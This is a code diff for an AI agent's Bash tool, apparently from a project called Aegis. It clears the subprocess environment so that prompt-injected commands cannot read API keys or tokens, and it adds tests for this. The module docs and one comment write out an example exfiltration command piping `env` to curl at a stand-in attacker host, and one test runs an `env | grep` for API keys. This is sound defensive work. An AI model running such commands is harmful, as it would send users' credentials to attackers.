@@ -15,6 +15,35 @@
 //! explicit `Allow` rule. `Plan` mode rejects it (no dry-run
 //! semantic for arbitrary shell — what would we even simulate?).
 //!
+//! ## Environment isolation
+//!
+//! The `sh -c` subprocess inherits **NOTHING** from the agent's env
+//! by default. We `env_clear()` and explicitly re-inject a small
+//! allowlist of vars the subprocess legitimately needs (`PATH`,
+//! `HOME`, `USER`, `TMPDIR`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TERM`).
+//!
+//! This is load-bearing security, not hygiene. The agent process is
+//! loaded with API keys for whichever providers the user has
+//! configured (`AEGIS_OPENAI_API_KEY`, `OPENAI_API_KEY`,
+//! `AEGIS_ANTHROPIC_API_KEY`, `AEGIS_GEMINI_API_KEY`, ...) plus the
+//! user's whole shell environment (`GITHUB_TOKEN`, `AWS_*`,
+//! `NPM_TOKEN`, `KUBECONFIG`, etc.). A prompt-injected
+//! `env | curl -X POST -d @- https://attacker.example` would
+//! exfiltrate every credential the user has loaded — a 5-character
+//! payload (`env`) gives the attacker every key. `env_clear()` cuts
+//! that channel: the subprocess sees only the allowlisted vars, and
+//! `env` lists nothing else.
+//!
+//! This intentionally breaks operations that need credentials
+//! delivered via env: `gh`, `npm publish`, `aws s3 cp`, `docker
+//! push`, etc., will fail when called via Bash. Those are exactly
+//! the operations a compromised agent shouldn't be performing
+//! unattended; if the user wants them, they should be deliberate
+//! re-authorisations outside the agent loop. A future opt-in
+//! `env_passthrough` config can land if real users hit a wall —
+//! per `docs/post_launch_discipline.md`, no surface expansion until
+//! that evidence arrives.
+//!
 //! ## Aegis-aware redirect parsing
 //!
 //! `parse_redirect_targets()` extracts write-destination paths from
@@ -66,6 +95,21 @@ const MAX_TIMEOUT_SECS: u64 = 600;
 /// Max captured bytes per stream — enough for normal CLI output,
 /// caps runaway loops. Truncation marker appended when exceeded.
 const MAX_OUTPUT_BYTES: usize = 256 * 1024;
+
+/// Variables the subprocess legitimately needs. Anything not in
+/// this list is stripped via `env_clear()` to prevent credential
+/// exfiltration via `env | curl ...` style prompt injection. See
+/// the module docs for the threat model.
+const ENV_PASSTHROUGH: &[&str] = &[
+    "PATH",     // exec dispatch — without this, nothing runs
+    "HOME",     // ~ expansion, ~/.gitconfig, ~/.cargo, etc.
+    "USER",     // some tools query identity
+    "TMPDIR",   // tempfile dispatch on macOS / BSD
+    "LANG",     // locale
+    "LC_ALL",
+    "LC_CTYPE",
+    "TERM",     // terminal-handling for non-tty tools that still check
+];
 
 #[derive(Debug, Deserialize)]
 struct BashInput {
@@ -150,13 +194,28 @@ impl BashTool {
             );
         }
 
-        let mut child = Command::new("sh")
-            .arg("-c")
+        let mut cmd = Command::new("sh");
+        cmd.arg("-c")
             .arg(&parsed.command)
             .current_dir(&self.workspace)
             .stdin(Stdio::null())
             .stdout(Stdio::piped())
-            .stderr(Stdio::piped())
+            .stderr(Stdio::piped());
+
+        // Strip parent env, re-inject only the allowlist. Without
+        // this, a prompt-injected `env | curl ... attacker.com`
+        // would exfiltrate every credential the agent process has
+        // loaded (LLM provider API keys, GitHub / AWS / NPM tokens
+        // from the user's shell, etc.). See module docs for full
+        // threat model.
+        cmd.env_clear();
+        for var in ENV_PASSTHROUGH {
+            if let Ok(value) = std::env::var(var) {
+                cmd.env(var, value);
+            }
+        }
+
+        let mut child = cmd
             .spawn()
             .map_err(|e| ToolError::new(format!("Bash spawn failed: {e}")))?;
 
@@ -493,6 +552,86 @@ mod tests {
         let out = tool.execute("Bash", &input).unwrap();
         assert!(out.contains("exit_code: 0"));
         assert!(dir.path().join("inside.txt").exists());
+    }
+
+    // ----------------------------------------------------------------
+    // Environment isolation. Subprocess must NOT inherit credentials
+    // from the agent process's env. See module docs for threat model.
+    // ----------------------------------------------------------------
+
+    #[test]
+    fn bash_subprocess_does_not_inherit_parent_secrets() {
+        // Unique marker name + value so this test is robust against
+        // parallel test execution and any other env vars the
+        // developer / CI happens to have set.
+        const LEAK_KEY: &str = "AEGIS_BASH_LEAK_TEST_b9f2e3a4";
+        const LEAK_VALUE: &str = "MUST_NOT_APPEAR_IN_SUBPROCESS_7c4d8f";
+
+        // Set marker on parent — analogous to a real API key the
+        // agent process would carry.
+        std::env::set_var(LEAK_KEY, LEAK_VALUE);
+
+        let dir = tempdir().unwrap();
+        let mut tool = BashTool::new(dir.path());
+        // The subprocess dumps its full env. If env_clear() is
+        // working, neither name nor value should be present.
+        let input = json!({ "command": "env" }).to_string();
+        let out = tool.execute("Bash", &input).unwrap();
+
+        std::env::remove_var(LEAK_KEY);
+
+        assert!(
+            !out.contains(LEAK_KEY),
+            "leak key {LEAK_KEY} appeared in subprocess env: {out}"
+        );
+        assert!(
+            !out.contains(LEAK_VALUE),
+            "leak VALUE {LEAK_VALUE} appeared in subprocess env: {out}"
+        );
+    }
+
+    #[test]
+    fn bash_subprocess_does_not_inherit_simulated_api_keys() {
+        // Same shape as the real attack vector: simulate the agent
+        // process having a provider API key in env, then run a
+        // command that would exfiltrate it.
+        const FAKE_OPENAI_KEY: &str = "sk-fake-test-key-leak-canary-3a8f1d";
+        std::env::set_var("AEGIS_OPENAI_API_KEY_TEST_LEAK", FAKE_OPENAI_KEY);
+
+        let dir = tempdir().unwrap();
+        let mut tool = BashTool::new(dir.path());
+        // The classic exfil pattern (without actually curling).
+        let input = json!({
+            "command": "env | grep -i api_key || echo CLEAN"
+        })
+        .to_string();
+        let out = tool.execute("Bash", &input).unwrap();
+
+        std::env::remove_var("AEGIS_OPENAI_API_KEY_TEST_LEAK");
+
+        assert!(
+            !out.contains(FAKE_OPENAI_KEY),
+            "API key value leaked via subprocess env: {out}"
+        );
+        // The grep should have found nothing → CLEAN printed.
+        assert!(
+            out.contains("CLEAN"),
+            "expected `env | grep api_key` to find nothing, got: {out}"
+        );
+    }
+
+    #[test]
+    fn bash_subprocess_keeps_path_so_basic_commands_still_run() {
+        // PATH is on the allowlist — `ls` must still resolve.
+        // If env stripping was over-aggressive (e.g. dropping PATH)
+        // this test catches the regression.
+        let dir = tempdir().unwrap();
+        std::fs::write(dir.path().join("hello.txt"), "hi").unwrap();
+        let mut tool = BashTool::new(dir.path());
+        let input = json!({ "command": "ls" }).to_string();
+        let out = tool.execute("Bash", &input).unwrap();
+        assert!(out.contains("exit_code: 0"), "ls failed: {out}");
+        assert!(out.contains("hello.txt"));
     }
 
     #[test]
